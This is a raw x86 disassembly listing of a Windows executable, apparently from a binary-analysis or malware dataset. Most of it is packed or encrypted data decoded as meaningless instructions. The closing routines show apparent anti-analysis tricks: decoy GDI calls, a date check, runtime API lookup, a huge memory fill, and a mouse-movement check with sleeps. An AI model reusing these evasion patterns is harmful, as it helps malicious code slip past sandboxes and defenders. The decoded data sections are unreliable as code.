fcmove st5
lodsb [ esi ]
jb r-xdata
movsb [ edi ] [ esi ]
sti
sti
js r-xdata
sti
sti
jbe r-xdata
sti
jo r-xdata
jae r-xdata
add al 0x8f
fcomip st3
jo r-xdata
popfd
jb r-xdata
dec esp
xchg [ esi ] eax
add al 0x4
add al 0x4
adc esp [ ebx + 0x4040444 ]
jge r-xdata
adc esi [ ecx ]
add al [ esp + eax ]
adc bh [ 0x6b040446 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x8e
add eax [ esi ]
pmuludq mm7 [ ecx - 0x73 ]
cmp al [ esp + eax ]
adc dh [ 0x6b040417 ]
add al 0xbf
cmp edi ebx
sti
add al 0x4
imul ebp [ ebx + 0x70 ] 0x43
adc dl ah
xor eax [ esp + eax ]
add al 0x4
div [ eax + 0x22 ]
popfd
jb r-xdata
sti
sti
jo r-xdata
imul esi [ eax + 0x43 ] 0x3b
sti
add edx ebx
retn 0xfbe
adc [ ebx ] 0x17
add al [ esp + eax ]
xchg ebx eax
retn
sti
sti
sti
jbe r-xdata
stosd [ edi ]
mov ebp 0xfbe04fd
js r-xdata
fucomip st3
adc ah [ ebp + 0x6b040444 ]
mov al [ 0x38a61e70 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffbb
adc ah [ eax ]
dec eax
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0xc ] 0x4c
cmp eax 0x737d72ac
sti
cmc
jo r-xdata
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
das
push es
add al 0x4
stosd [ edi ]
test al 0x4
lodsd [ esi ]
out dx eax
jb r-xdata
popfd
jb r-xdata
xchg ebx eax
aaa
sti
sti
sti
adc esp [ eax ]
add al [ esp + eax ]
das
push es
add al 0x4
jle r-xdata
jmp r-xdata
shrd [ edx + 0x7d ] esi 0x7f
hlt
sub_484cdd
lds ecx [ edi ]
sti
sti
imul ebp [ esp + eax + 0x70f3df8f ] 0x3
jg r-xdata
stosd [ edi ]
jbe r-xdata
fucomip st3
adc ah [ ebp + 0x6b040444 ]
mov al [ 0x38a61e70 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffbb
adc ah [ eax ]
dec eax
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0xc ] 0x4c
lodsb [ esi ]
jb r-xdata
sti
sti
adc esp [ eax ]
add al [ esp + eax ]
lodsb [ esi ]
jb r-xdata
sbb ebp [ ebx + 0x42c2112 ]
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
sti
sti
jo r-xdata
imul esi [ eax + 0x43 ] 0x3b
sti
add edx ebx
retn 0xfbe
jo r-xdata
jae r-xdata
add al 0x8f
fcomip st3
jo r-xdata
popfd
jb r-xdata
pmuludq mm7 [ ecx - 0x73 ]
cmp al [ esp + eax ]
adc dh [ 0x6b040417 ]
add al 0xbf
cmp edi ebx
sti
sti
adc esi [ ecx ]
add al [ esp + eax ]
adc bh [ 0x6b040446 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x8e
jbe r-xdata
imul ebp [ ebx + 0x70 ] 0x43
add al 0x4
adc dl ah
xor eax [ esp + eax ]
xchg ebx eax
aaa
add al 0x4
div [ eax + 0x22 ]
popfd
jb r-xdata
mov ebp 0xfbe04fd
js r-xdata
dec esp
xchg [ esi ] eax
add al 0x4
cmp eax 0x737d72ac
sti
cmc
jo r-xdata
popfd
jb r-xdata
jmp r-xdata
sub_484e00
add al 0x4
stosd [ edi ]
adc ah [ ebp + 0x12 ]
add al 0x4
jle r-xdata
popfd
jb r-xdata
hlt
add al 0x4
adc cl [ eax + 0x36 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x6c
xor ecx eax
add al 0x9d
jb r-xdata
mov esi 0x3be780f
rol edx cl
mov esi 0x8d79f40f
pop ds
stosd [ edi ]
jbe r-xdata
pop es
sti
sti
sti
add al 0xcd
add al 0x6c
psubq mm7 mm3
sti
cmp [ ebx ] dl
push cs
inc esi
add al 0x4
jbe r-xdata
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x4
insb
xor [ ecx + edx * 4 + 0x10c712b9 ] esp
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x76 ] 0xffffffbe
sub ebp [ ebx + 0x13f3be70 ]
int3
add edx ebx
retn 0xfbe
jae r-xdata
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0xc ] 0x4c
test al 0xa8
xchg ecx eax
[ eax + 0x7e76a8a8 ]
imul esi [ eax + 0x43 ] 0x3b
sti
stosd [ edi ]
jbe r-xdata
fucomip st3
adc ah [ ebp + 0x6b040444 ]
mov al [ 0x38a61e70 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffbb
adc ah [ eax ]
dec eax
lodsb [ esi ]
jb r-xdata
sbb ebp [ ebx + 0x42c2112 ]
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
jo r-xdata
jae r-xdata
add al 0x8f
fcomip st3
jo r-xdata
popfd
jb r-xdata
cmp al [ esp + eax ]
adc dh [ 0x6b040417 ]
add al 0xbf
pmuludq mm7 [ ecx - 0x73 ]
sti
sti
jo r-xdata
cmp edi ebx
sti
sti
adc esi [ ecx ]
add al [ esp + eax ]
adc bh [ 0x6b040446 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x8e
jbe r-xdata
add al 0x4
imul ebp [ ebx + 0x70 ] 0x43
adc dl ah
xor eax [ esp + eax ]
add al 0x4
xchg ebx eax
aaa
div [ eax + 0x22 ]
popfd
jb r-xdata
mov ebp 0xfbe04fd
js r-xdata
dec esp
xchg [ esi ] eax
add al 0x4
cmp eax 0x737d72ac
sti
cmc
jo r-xdata
popfd
jb r-xdata
jmp r-xdata
sub_484ece
sti
adc bl al
cmp al [ esp + eax ]
jg r-xdata
stc
stosd [ edi ]
jbe r-xdata
sbb eax [ esp + ebp * 2 ]
sti
sti
test al 0x12
jpo r-xdata
jo r-xdata
xor eax [ esi ]
add al 0x4
stosd [ edi ]
add al 0xad
xchg ebx eax
jo r-xdata
add al 0x12
xchg esp eax
add al 0x4
imul ebp [ ebx + 0x76 ] 0xffffffb6
daa
adc edi [ edx ]
inc edi
add al 0x4
adc dl [ esi + edi * 8 + 0x4acfbfb ]
lodsd [ esi ]
cmp al [ edi + 0x4 ]
jb r-xdata
not [ edx ]
adc al 0x41
add al 0x4
imul ebp [ ebx + 0x7e ] 0x3b
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax - 0x41 ] 0xffffffdf
call [ edx ]
sbb bh ch
sti
sti
popfd
jb r-xdata
adc dh [ edi ]
daa
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffc8
cmp edi [ ebx + 0x6b6b3832 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx ] 0x8
sub eax 0x72120404
sti
sti
jo r-xdata
sti
fwait
jo r-xdata
lodsb [ esi ]
add al 0xad
das
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
js r-xdata
fdivr [ edx ]
add al 0x4
adc dl [ esi + 0x3e ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x7e ] 0x3b
adc cl [ eax ]
adc eax 0x6b6b0404
hlt
mov esi 0xfbe7013
jb r-xdata
popfd
jb r-xdata
mov esi 0x9d38702d
pop ss
enter 0x123b 0x41
inc edi
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffac
lodsb [ esi ]
xchg ecx eax
clc
lodsb [ esi ]
xchg ecx eax
cli
xchg ebx eax
sti
sti
sti
jpo r-xdata
sub eax 0x729d3870
mov esi 0x9d3a7023
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x38 ] 0x3b
mov ebx 0x6b6b3832
jb r-xdata
and esi [ eax + 0x3a ]
popfd
inc eax
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
jpo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
enter 0xbb3b 0x32
cmp [ ebx + 0x6b ] ch
and [ edx ] edx
push ss
xor al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x72
mov esi 0x7be720f
inc ebx
sti
sti
sti
sti
hlt
jb r-xdata
jmp r-xdata
imul ebp [ ebx + 0x6b ] 0x7b
xchg bl ch
stc
hlt
sub_484fe0
adc ah [ eax + 0x40 ]
jb r-xdata
jmp r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x38 ] 0x3b
mov ebx 0x6b6b3832
and esi [ eax + 0x3a ]
popfd
imul ebp [ ebx + 0x6b ] 0x7b
xchg bl ch
stc
hlt
lodsb [ esi ]
add al 0xad
fwait
jo r-xdata
das
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
enter 0xbb3b 0x32
cmp [ ebx + 0x6b ] ch
and [ edx ] edx
push ss
xor al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x72
mov esi 0x7be720f
inc ebx
sti
sti
sti
sti
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax - 0x41 ] 0xffffffdf
call [ edx ]
sbb bh ch
sti
sti
popfd
jb r-xdata
adc dh [ edi ]
daa
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffc8
cmp edi [ ebx + 0x6b6b3832 ]
mov esi 0xfbe7013
jb r-xdata
popfd
jb r-xdata
mov esi 0x9d38702d
pop ss
enter 0x123b 0x41
inc edi
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffac
lodsb [ esi ]
xchg ecx eax
clc
lodsb [ esi ]
xchg ecx eax
cli
xchg ebx eax
sti
sti
sti
jpo r-xdata
jb r-xdata
sub eax 0x729d3870
mov esi 0x9d3a7023
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
jpo r-xdata
inc eax
sub_48580a
popfd
jb r-xdata
add al 0x78
aas
or [ edx ] edx
mov [ 0x6b040426 ] eax
imul ecx eax 0x3b
popfd
jb r-xdata
insb
psubq mm7 mm3
sti
movsb [ edi ] [ esi ]
adc cl [ eax + 0x27 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x3c
mov esi 0x91fb910e
xor eax 0x2dbe729d
popfd
jb r-xdata
sti
popfd
cmp al 0xbe
add al [ ebx + ebp ]
adc bh [ edx + 0x43 ]
add al 0x4
imul ebp [ ebx - 0x63 ] 0x72
scasb [ edi ]
imul ebp [ ebx + 0x6b ] 0x6b
setno [ esi - 0x62686e5d ]
jb r-xdata
xchg ecx eax
sti
xchg ecx eax
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ esi + edi * 4 ] 0xe
or eax 0x129d91a3
popfd
dec edx
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
dec ebx
stosd [ edi ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x3c ] 0xffffffbe
push cs
sub eax 0xfb6729d
xchg ecx eax
sahf
mov [ 0x729d9791 ] eax
mov esi 0x9d91a30d
adc bl [ ebp + 0x6b04044a ]
sahf
popfd
ja r-xdata
imul eax [ ebp * 2 - 0x4040485 ] 0x12
mov edi 0x6b040411
imul ecx eax 0x3b
movsd [ edi ] [ esi ]
xor bh [ eax ]
imul ebp [ ebx - 0xc ] 0x7e
or eax [ ebx ]
add al 0x4
jbe r-xdata
sti
sti
adc bh [ edi + 0x6b040411 ]
fistp [ ecx ]
add al 0x4
popfd
js r-xdata
sbb esp [ ecx + 0x19ae729d ]
enter 0x9129 0x95
popfd
jb r-xdata
add al 0xa2
add al 0x4
adc eax [ edx + edi - 0x5d5dfbfc ]
jle r-xdata
cmp [ ebx + 0x6b ] ch
hlt
sti
hlt
sti
js r-xdata
pop ds
jo r-xdata
scasb [ edi ]
push es
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
hlt
jb r-xdata
and eax 0x9d9e91a1
stc
hlt
adc bl al
popfd
jb r-xdata
popfd
jb r-xdata
int1
lodsd [ esi ]
jbe r-xdata
xor esi [ eax + 0x2b ]

inc ebx
jo r-xdata
mov [ 0x7ef43b7e ] al
sub eax 0x76040403
mov esi 0x76adab6f
jbe r-xdata
aaa
mov eax [ 0x729d8991 ]
mov esi 0x1644122b
add al 0x4
popfd
jb r-xdata
add al 0x13
test [ edx ] bh
add al 0x4
mov [ 0xfffffffff43b7ea2 ] al
jle r-xdata
xor [ ecx + 0x729d8c91 ] esp
scasb [ edi ]
mov esi 0xde91a30b
popfd
jb r-xdata
popfd
jb r-xdata
ja r-xdata
daa
mov eax [ 0x729d9791 ]
scasb [ edi ]
cmp bh cl
popfd
jle r-xdata
add eax [ esp + eax ]
jbe r-xdata
sub [ ecx - 0x518d626b ] edx
or [ ebx + 0x729d9291 ] esp
mov esi 0x729da30f
mov esi 0x913bc80d
mov edi 0x3be729d
adc ch [ edi + 0x5c ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ edx + esi * 2 - 0x3aecf45a ] 0x4b
add al 0x4
js r-xdata
or eax 0x4235d12
add al 0x6b
inc ecx
mov eax [ 0x4174812 ]
add al 0x6b
imul edi [ ebx - 0x7d ] 0xfffffff9
sti
adc cl dh
inc esp
add al 0x4
enter 0xa53b 0xa0
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
add al 0x6b
imul ebp [ ebx - 0xc ] 0x7e
add al 0x4
adc cl [ ebx + eax + 0x4 ]
popfd
jb r-xdata
adc bl [ ebp + 0x23 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp + 0x7033ae72 ] 0x2b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x6d
jpo r-xdata
outsd
stosd [ edi ]
lodsd [ esi ]
jbe r-xdata
imul edi [ eax + 0x3f ] 0xffffffc3
jbe r-xdata
idiv [ esi + 0x3b ]
adc cl [ edi ]
sbb al [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ eax - 0x42 ] 0x7
shl [ edx + 0x3bec2a2 ] cl
adc ch [ ebp + 0x6b04040e ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
js r-xdata
pop ss
stosd [ edi ]
cmp al 0xbe
pop ss
mov [ ebx - 0x41c36862 ] dl
or edx [ edi + 0x4fbc9c8 ]
sub [ eax + 0x23 ] dh
jle r-xdata
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx - 0x41 ] 0xffffffdf
fstp [ esi + 0x3b ]
hlt
retn
cmp eax [ esp + eax ]
adc bh [ ecx + 0x41 ]
hlt
sub_4858a0
stc
xor esi [ eax + 0x2b ]
popfd
jb r-xdata
adc bl [ ebp + 0x23 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp + 0x7033ae72 ] 0x2b
add al 0x13
test [ edx ] bh
add al 0x4
mov [ 0xfffffffff43b7ea2 ] al
jle r-xdata
xor [ ecx + 0x729d8c91 ] esp
scasb [ edi ]
popfd
jle r-xdata
cmp bh cl
add eax [ esp + eax ]
jbe r-xdata
ja r-xdata
daa
mov eax [ 0x729d9791 ]
scasb [ edi ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x6d
jpo r-xdata
outsd
stosd [ edi ]
lodsd [ esi ]
jbe r-xdata
add al 0x6b
imul ebp [ ebx - 0xc ] 0x7e
add al 0x4
adc cl [ ebx + eax + 0x4 ]
fistp [ ecx ]
add al 0x4
popfd
js r-xdata
sbb esp [ ecx + 0x19ae729d ]
enter 0x9129 0x95
popfd
jb r-xdata
imul eax [ ebp * 2 - 0x4040485 ] 0x12
mov edi 0x6b040411
imul ecx eax 0x3b
movsd [ edi ] [ esi ]
xor bh [ eax ]
imul ebp [ ebx - 0xc ] 0x7e
or eax [ ebx ]
add al 0x4
jbe r-xdata
sti
sti
adc bh [ edi + 0x6b040411 ]
popfd
jb r-xdata
cmp [ ebx + 0x6b ] ch
hlt
sti
hlt
sti
js r-xdata
pop ds
jo r-xdata
popfd
jb r-xdata
dec ebx
stosd [ edi ]
or eax 0x4235d12
add al 0x6b
inc ecx
mov eax [ 0x4174812 ]
add al 0x6b
imul edi [ ebx - 0x7d ] 0xfffffff9
sti
adc cl dh
inc esp
add al 0x4
enter 0xa53b 0xa0
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
and eax 0x9d9e91a1
stc
hlt
adc bl al
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x3c ] 0xffffffbe
push cs
xchg ecx eax
sti
xchg ecx eax
sti
popfd
cmp al 0xbe
add al [ ebx + ebp ]
adc bh [ edx + 0x43 ]
add al 0x4
imul ebp [ ebx - 0x63 ] 0x72
scasb [ edi ]
sub eax 0xfb6729d
xchg ecx eax
sahf
mov [ 0x729d9791 ] eax
mov esi 0x9d91a30d
adc bl [ ebp + 0x6b04044a ]
jb r-xdata
sahf
popfd
ja r-xdata
lodsd [ esi ]
jbe r-xdata
popfd
jb r-xdata
int1

inc ebx
jo r-xdata
add al 0xa2
add al 0x4
adc eax [ edx + edi - 0x5d5dfbfc ]
jle r-xdata
mov [ 0x7ef43b7e ] al
sub eax 0x76040403
mov esi 0x76adab6f
jbe r-xdata
aaa
mov eax [ 0x729d8991 ]
mov esi 0x1644122b
add al 0x4
popfd
jb r-xdata
mov esi 0xde91a30b
popfd
jb r-xdata
scasb [ edi ]
push es
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
hlt
sub [ ecx - 0x518d626b ] edx
or [ ebx + 0x729d9291 ] esp
mov esi 0x729da30f
mov esi 0x913bc80d
mov edi 0x3be729d
adc ch [ edi + 0x5c ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ edx + esi * 2 - 0x3aecf45a ] 0x4b
add al 0x4
js r-xdata
imul edi [ eax + 0x3f ] 0xffffffc3
jbe r-xdata
idiv [ esi + 0x3b ]
adc cl [ edi ]
sbb al [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ eax - 0x42 ] 0x7
shl [ edx + 0x3bec2a2 ] cl
adc ch [ ebp + 0x6b04040e ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
js r-xdata
pop ss
stosd [ edi ]
cmp al 0xbe
pop ss
mov [ ebx - 0x41c36862 ] dl
or edx [ edi + 0x4fbc9c8 ]
sub [ eax + 0x23 ] dh
jle r-xdata
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx - 0x41 ] 0xffffffdf
fstp [ esi + 0x3b ]
hlt
retn
cmp eax [ esp + eax ]
adc bh [ ecx + 0x41 ]
hlt
sub_4859b1
inc esp
add al 0x4
adc dh ch
push eax
add al 0x4
imul ebp [ ebx + 0x13 ] 0xffffffed
push ebp
add al 0x4
adc al [ eax + 0x45 ]
add al 0x4
imul esi [ esi + 0x76 ] 0x77
push es
add al 0x4
adc esp edx
cmp eax [ esp + eax ]
adc bh [ ecx + 0x41 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx - 0x41 ] 0xffffffdf
fstp [ esi + 0x3b ]
hlt
sub_485b38
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038c0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485b64
retn
sub_485b68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push sub_485d46
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485d4d
retn
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
call GetLastError
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
jmp r-xdata
mov ebx 0x2420
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
nop
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
mov ebx 0x86e6
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
dec ebx
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
nop
nop
push 0x4
push 0x3000
push 0x1dffa6bc
push 0x0
call VirtualAlloc
mov esi eax
nop
nop
test esi esi
je r-xdata
mov ebx 0x1
nop
mov ecx ebx
nop
lea eax [ ecx + 0x1 ]
push ecx
mov ecx 0xee
xor edx edx
div ecx
pop ecx
add ecx esi
mov [ ecx ] dl
nop
inc ebx
cmp ebx 0x1dff84e2
jne r-xdata
nop
push 0x8000
push 0x0
push esi
call VirtualFree
nop
mov ebx 0x86c5
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call IntersectClipRect
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
nop
nop
push rw-data
call GetCursorPos
nop
nop
push 0x0
push 0x26
call SleepEx
nop
nop
cmp ebx 0x4
jbe r-xdata
nop
nop
inc ebx
nop
nop
mov eax [ edi ]
mov [ rw-data ] eax
nop
push edi
call GetCursorPos
nop
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x2c
jbe r-xdata
nop
nop
push 0x0
call sub_480070
nop
nop
jmp r-xdata
sub_485dac
bound eax [ eax ]
add [ eax ] al
mov ah 0x5d
dec eax
add al al
pushad
inc eax
add [ eax - 0x4bffbfa0 ] dl
pop esi
inc eax
add [ eax + 0x5e ] ah
inc eax
add [ eax ] bh
popad
inc eax
add [ eax ] cl
popad
inc eax
add ah dh
outsb
inc eax
add ah al
outsb
inc eax
add [ edi + ebp * 2 ] ch
inc eax
add ah bh
outsb
inc eax
add [ eax ] ah
push ecx
inc ecx
add al dh
push eax
inc ecx
add [ edx + esi * 2 + 0x40 ] al
add [ edx + esi * 2 ] dl
inc eax
add [ ecx + ebx * 8 + 0x40 ] cl
add ah cl
xlat
inc eax
add [ eax - 0x77ffbf1f ] bh
loope r-xdata
add [ eax + edx * 4 ] dh
inc edx
add [ eax + edx * 4 ] al
inc edx
add [ ebp + edi * 8 + 0x41 ] ch
add [ edi * 8 - 0x74bbffbf ] bh
inc edx
add [ eax - 0x76 ] dh
inc edx
add [ ebx - 0x1ca3ffbc ] cl
inc esp
add ah dh
xchg edi eax
inc edx
add ah al
xchg edi eax
inc edx
add [ eax + 0x49 ] cl
inc ebp
add al bl
dec eax
inc ebp
add [ ebp * 4 - 0x5303ffbe ] ch
inc edx
add ah dl
mov dh 0x42
add [ eax + 0x380042b6 ] al
mov eax 0xb8080042
inc edx
add [ eax ] al
mov eax 0xb7d00042
inc edx
add al cl
mov bh 0x42
add [ eax - 0x6fffbd49 ] bl
mov bh 0x42
add [ eax - 0x49 ] ah
inc edx
add [ eax - 0x48 ] dh
inc edx
add [ eax - 0x48 ] al
inc edx
add [ edi + 0x27740043 ] ah
inc ebx
add [ ebx + edx * 4 - 0x6cabffbd ] al
inc ebx
add [ eax + ebp * 4 ] ah
inc edx
add ah dh
cmpsd [ esi ] [ edi ]
inc edx
add [ eax - 0x58 ] ch
inc edx
add [ eax + ebp * 4 ] ch
inc edx
add [ eax + 0x780042b8 ] ch
mov eax 0xb8e00042
inc edx
add [ eax + 0x180042b8 ] dh
mov edi 0xbebc0042
inc edx
add [ eax ] bh
